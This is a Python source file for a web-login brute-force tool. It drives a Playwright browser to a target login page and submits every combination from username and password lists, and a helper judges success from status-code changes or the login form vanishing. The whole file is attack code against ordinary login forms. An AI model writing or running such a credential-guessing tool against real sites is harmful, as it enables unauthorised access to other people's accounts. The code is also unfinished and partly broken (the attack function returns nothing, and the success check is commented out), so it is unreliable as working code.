import logging
import sys
import webParser
import requests
from bs4 import BeautifulSoup
import ssl
from html_similarity import style_similarity, structural_similarity, similarity
from lxml import html
from playwright.async_api import async_playwright 


async def brute(content):
    """
    sends all combinations for usernames and passwords to the attack function on the login page
    """
    content['statusCode'] = 'wrong'
    p = await async_playwright().start()
 
    browser = await p.firefox.launch()
    page = await browser.new_page()
    await page.goto(content['url'])
    if content['button']['value']:
        content['buttonClick'] =  page.locator('[type="submit"][value='+content['button']['value'] +']')

    else:
        content['buttonClick'] =  page.locator('[type="submit"][text='+content['button'].text +']')
    
   
    content['statusCode'] = await get_status_code(content, page)

    for username in content["Usernames"]:
        content["username"] = username.strip()
        for password in content["Passwords"]:
            content["password"] = password.strip()
            await attack(content, page)
    await browser.close()
    await p.stop()
    
def getResponse(response, content):
    content['status_code'] = response.status
    
async def attack(content, page):
    """
    create a packet containing fake headers and the payload(username,password) and submit it to the server
    """

    await page.goto(content['url'])
    # print(str(content['user_param']), str(content['user_param']))
    await page.fill('input[name='+content['user_param']+']', content['username'])
    await page.fill('input[name='+content['password_param']+']', content['password'])
    page.on('response', lambda response: getResponse(response, content))

    await content['buttonClick'].click()
    status_code = content['status_code']
    print(str(status_code))

    # if check_login(resp, content, payload):
    #     logging.info(
    #         "login successfull\n\nusername: "
    #         + content["username"]
    #         + "\npassword: "
    #         + content["password"]
    #     )

    #     sys.exit(1)
    # return resp.status_code


def check_login(response, args, payload):
    """
    checks if login was successful by checking if status code changed and checks if form is still in the page
    """
    if args['statusCode'] == 'wrong':
        return False
    
    if response.status_code >= 400:
        return False

    elif response.status_code != args['statusCode']:
        return True
    
    else:
        if args['type'] != 'javascript':
            doc = html.document_fromstring(response.text)
            form = webParser.pickForm(doc.xpath('//form'), payload)
            if form == None:
                return True
    return False


########################################################################################

async def  get_status_code(parameters, page):
    parameters["username"] = 'test' # change to random!
    parameters["password"] = 'test'
    statusCode = await attack(parameters, page)
    return statusCode